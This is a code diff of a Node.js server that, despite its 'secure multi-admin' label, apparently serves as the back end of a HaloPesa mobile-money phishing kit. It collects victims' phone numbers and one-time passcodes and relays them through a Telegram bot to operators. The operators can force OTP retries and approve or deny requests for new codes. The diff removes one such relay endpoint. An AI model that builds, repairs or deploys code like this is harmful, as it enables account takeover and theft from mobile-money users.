@@ -1,6 +1,6 @@
 /**
  * **HALOPESA TANZANIA - SECURE MULTI-ADMIN SERVER**
- * Complete Integrated Version with Spinner States, Retry Handling, and Admin Commands.
+ * Configured for deployment via 'node server.js'
  */
 
 const express = require('express');
@@ -357,7 +357,7 @@ async function initBot() {
           break;
         case 'WRONG_OTP':
           session.status = 'RETRY_OTP';
-          session.otp = ''; // Clear OTP to allow retry loop
+          session.otp = '';
           await bot.sendMessage(chatTarget, `⚠️ OTP Siyo Sahihi`);
           break;
         default:
@@ -439,34 +439,6 @@ app.get('/api/check-status/:userId', (req, res) => {
   res.status(200).json({ status: session.status, otp: session.otp || '' });
 });
 
-app.post('/api/request-new-otp', async (req, res) => {
-  try {
-    const { userId } = req.body || {};
-    const session = sessions.get(userId);
-    if (!session) return res.status(404).json({ success: false, error: 'Kipindi hakikupatikana' });
-
-    session.status = 'REQUESTING_NEW_OTP';
-    const targetChat = session.adminChatId;
-
-    if (bot && targetChat) {
-      await bot.sendMessage(targetChat, `⚠️ APPLICANT IS REQUESTING NEW OTP\n\nNUMBER: ${session.contact}`, {
-        reply_markup: {
-          inline_keyboard: [
-            [
-              { text: '✅ ALLOW OTP', callback_data: `ALLOW_OTP_${userId}` },
-              { text: '❌ DENY', callback_data: `DENY_OTP_${userId}` }
-            ]
-          ]
-        }
-      });
-    }
-
-    return res.status(200).json({ success: true });
-  } catch (err) {
-    return res.status(500).json({ success: false, error: 'Hitilafu' });
-  }
-});
-
 app.post('/api/submit-otp', async (req, res) => {
   try {
     const { userId, otp } = req.body || {};
@@ -507,3 +479,4 @@ const PORT = process.env.PORT || 10000;
 app.listen(PORT, async () => {
   await initBot();
 });
+               
